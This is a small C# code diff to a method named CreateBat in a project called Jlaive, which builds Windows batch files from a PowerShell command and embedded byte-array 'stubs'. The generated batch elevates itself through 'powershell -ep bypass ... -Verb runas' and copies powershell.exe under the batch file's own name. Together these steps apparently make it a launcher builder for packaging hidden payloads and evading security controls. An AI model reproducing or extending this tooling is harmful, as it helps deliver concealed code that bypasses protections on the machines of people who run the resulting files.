@@ -26,15 +26,15 @@ namespace Jlaive
         public string CreateBat(string pscommand, byte[] stub, byte[] stub2, bool hidden, bool runas)
         {
             StringBuilder builder = new StringBuilder();
-            builder.AppendLine("@echo off");
             if (runas)
             {
-                string runascode =
-                    "if not %errorlevel%==0 ( powershell -noprofile -ep bypass -command Start-Process -FilePath '%0' -ArgumentList '%cd%' -Verb runas & exit /b )"
-                    + Environment.NewLine
-                    + "cd \"%~dp0\"";
-                builder.AppendLine("net file");
-                builder.AppendLine(runascode);
+                builder.AppendLine(
+                    "net file" +
+                    Environment.NewLine +
+                    "if not %errorlevel%==0 ( powershell -noprofile -ep bypass -command Start-Process -FilePath '%0' -ArgumentList '%cd%' -Verb runas & exit /b )" +
+                    Environment.NewLine +
+                    "cd \"%~dp0\""
+                );
             }
             builder.AppendLine(@"copy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe /y ""%~0.exe""");
             builder.AppendLine("cls");
